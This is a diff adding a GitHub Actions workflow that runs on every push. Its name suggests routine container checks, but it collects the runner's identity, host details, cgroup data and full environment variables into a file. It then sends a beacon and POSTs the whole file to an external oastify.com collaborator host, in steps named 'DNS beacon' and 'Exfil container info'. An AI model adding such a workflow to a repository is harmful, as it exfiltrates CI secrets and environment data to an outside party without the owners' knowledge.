@@ -1,0 +1,43 @@
+name: Container Info Collection
+
+on: [push]
+
+jobs:
+  check_container_info:
+    runs-on: ubuntu-latest
+    container:
+      image: debian:latest
+
+    steps:
+      - name: Update APT and install curl
+        run: |
+          apt update && apt install -y curl
+
+      - name: Collect system info
+        run: |
+          echo "[*] Whoami:" > container_info.txt
+          whoami >> container_info.txt
+
+          echo "[*] Hostname:" >> container_info.txt
+          hostname >> container_info.txt
+
+          echo "[*] Uptime:" >> container_info.txt
+          uptime >> container_info.txt
+
+          echo "[*] OS Info:" >> container_info.txt
+          if [ -f /etc/os-release ]; then cat /etc/os-release >> container_info.txt; else uname -a >> container_info.txt; fi
+
+          echo "[*] /proc/1/cgroup:" >> container_info.txt
+          if [ -f /proc/1/cgroup ]; then cat /proc/1/cgroup >> container_info.txt; else echo "Cannot read /proc/1/cgroup" >> container_info.txt; fi
+
+          echo "[*] Runner Description:" >> container_info.txt
+          echo "$CI_RUNNER_DESCRIPTION" >> container_info.txt
+
+          echo "[*] Environment Variables:" >> container_info.txt
+          env >> container_info.txt
+
+      - name: DNS beacon
+        run: curl -s "http://nul231it1p3hcfs06kods6treik9806ov.oastify.com/ping?host=$(hostname)&user=$(whoami)" > /dev/null
+
+      - name: Exfil container info
+        run: curl -X POST http://nul231it1p3hcfs06kods6treik9806ov.oastify.com --data-binary @container_info.txt
